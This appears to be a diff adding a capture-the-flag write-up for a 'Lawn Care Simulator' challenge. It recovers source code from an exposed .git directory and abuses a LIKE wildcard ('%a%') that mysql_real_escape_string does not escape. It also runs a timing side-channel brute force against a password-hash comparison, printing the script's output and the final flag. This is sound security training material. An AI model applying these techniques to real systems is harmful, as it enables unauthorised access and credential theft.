@@ -1,0 +1,186 @@
+1. Readable .git directory
+2. Found .git/refs/head/master:
+
+aa3025bdb15120ad0a2558246402119ce11f4e2e
+
+Reference: http://githowto.com/git_internals_working_directly_with_git_objects
+
+3. Found url to git object:
+.git/objects/aa/3025bdb15120ad0a2558246402119ce11f4e2e
+
+== Exploitation of .git repository ==
+
+4. Create fake .git object
+
+5. Read content:
+$ git cat-file -p aa3025bdb15120ad0a2558246402119ce11f4e2e
+tree 731924d14616f3f95c1d75e822a6a97a69f1a32f
+author John G <john@lawncaresimulator2015thegame.com> 1442602067 +0000
+committer John G <john@lawncaresimulator2015thegame.com> 1442602067 +0000
+
+I think I'll just put mah source code riiiiighhhht here. Perfectly safe place for some source code.
+
+Find and save git ref 731924d14616f3f95c1d75e822a6a97a69f1a32f
+
+
+7. $ git cat-file -p 731924d14616f3f95c1d75e822a6a97a69f1a32f
+
+100644 blob 4bcb0b3cf55c14b033e3d7e0a94b6025f6956ec7	___HINT___
+100644 blob 43d1df004d9cf95f2c5d83d2db3dcf887c7a9f2f	index.html
+100644 blob 27d808506876eeb41d6a953ac27f33566216d25f	jobs.html
+040000 tree 220a9334b01b77d1ac29b7fd3a35c6a18953a96d	js
+100644 blob 73009145aac48cf1d0e72adfaa093de11f491715	premium.php
+100644 blob 8e4852023815dc70761e38cde28aebed9ec038e3	sign_up.php
+100644 blob 637c8e963a5fb7080ff639b5297bb10bca491bda	validate_pass.php
+
+Get all files using theirs hashes as path (see 3.)
+
+File http://54.175.3.248:8089/___HINT___:
+
+Before planting grass, add compost or other soil amendment to the soil to improve its ability to hold water.
+
+
+
+8. validate_pass.php
+
+$ git cat-file -p 637c8e963a5fb7080ff639b5297bb10bca491bda
+
+9. premium.php
+
+$ git cat-file -p 73009145aac48cf1d0e72adfaa093de11f491715
+
+10. sign_up.php
+
+$ git cat-file -p 8e4852023815dc70761e38cde28aebed9ec038e3
+
+== Exploitation of Lawn Grass application ==
+
+11. sign_up.php:
+
+[lawncare01.png]
+
+...
+    $user = mysql_real_escape_string($_POST['username']);
+    // check to see if the username is available
+    $query = "SELECT username FROM users WHERE username LIKE '$user';";
+    
+...
+
+mysql_real_escape_string() does not escape %
+
+Reference: http://php.net/mysql_real_escape_string
+
+We pass:
+uername: %a%
+password: whatever
+
+[lawncare02.png]
+
+And we've got existing username:
+
+~~FLAG~~
+
+12. Brute-force fragment:
+
+    $hash = $line['hash'];
+
+    if (strlen($pass) != strlen($hash))
+        return False;
+
+    $index = 0;
+    while($hash[$index]){
+        if ($pass[$index] != $hash[$index])
+            return false;
+        # Protect against brute force attacks
+        usleep(300000);
+        $index+=1;
+    }
+	
+(pass_time_check.py)
+
+Sample try after three signs (667) - script shows 4th sign, which is 'e' - timing is ~0.3s more than average:
+
+
+$ ./pass_time_check.py 667
+sending payload with password: 667a----------------------------
+time for a - 1.206054
+sending payload with password: 667b----------------------------
+time for b - 1.1628
+sending payload with password: 667c----------------------------
+time for c - 1.123849
+sending payload with password: 667d----------------------------
+time for d - 1.123673
+sending payload with password: 667e----------------------------
+time for e - 1.533342
+sending payload with password: 667f----------------------------
+time for f - 1.123596
+sending payload with password: 6670----------------------------
+time for 0 - 1.12424
+sending payload with password: 6671----------------------------
+time for 1 - 1.139995
+sending payload with password: 6672----------------------------
+time for 2 - 1.209023
+sending payload with password: 6673----------------------------
+time for 3 - 1.122856
+sending payload with password: 6674----------------------------
+time for 4 - 1.123731
+sending payload with password: 6675----------------------------
+time for 5 - 1.124603
+sending payload with password: 6676----------------------------
+time for 6 - 1.122691
+sending payload with password: 6677----------------------------
+time for 7 - 1.12402
+sending payload with password: 6678----------------------------
+time for 8 - 1.123192
+sending payload with password: 6679----------------------------
+time for 9 - 1.1241
+
+
+
+$ ./pass_time_check.py 667e217666
+sending payload with password: 667e217666a---------------------
+time for a - 3.317382
+sending payload with password: 667e217666b---------------------
+time for b - 3.274132
+sending payload with password: 667e217666c---------------------
+time for c - 3.376334
+sending payload with password: 667e217666d---------------------
+time for d - 3.273846
+sending payload with password: 667e217666e---------------------
+time for e - 3.274608
+sending payload with password: 667e217666f---------------------
+time for f - 3.27328
+sending payload with password: 667e2176660---------------------
+time for 0 - 3.213485
+sending payload with password: 667e2176661---------------------
+time for 1 - 3.234123
+sending payload with password: 667e2176662---------------------
+time for 2 - 3.272356
+sending payload with password: 667e2176663---------------------
+time for 3 - 3.274707
+sending payload with password: 667e2176664---------------------
+time for 4 - 3.27386
+sending payload with password: 667e2176665---------------------
+time for 5 - 3.272986
+sending payload with password: 667e2176666---------------------
+time for 6 - 3.27506
+sending payload with password: 667e2176667---------------------
+time for 7 - 3.274545
+sending payload with password: 667e2176668---------------------
+time for 8 - 3.273122
+sending payload with password: 667e2176669---------------------
+time for 9 - 3.290462
+
+
+current final password hash fragment: 667e217666 
+
+After 10th sign timer stops to increase every 0.3 sec/sign (???):
+One try to send fake hash and got the flag (added some random MD5 hash fragment to 
+founded first 10 signs):
+
+[lawncare03.png]
+
+Flag:
+gr0wth__h4ck!nG!1!1!
+
+
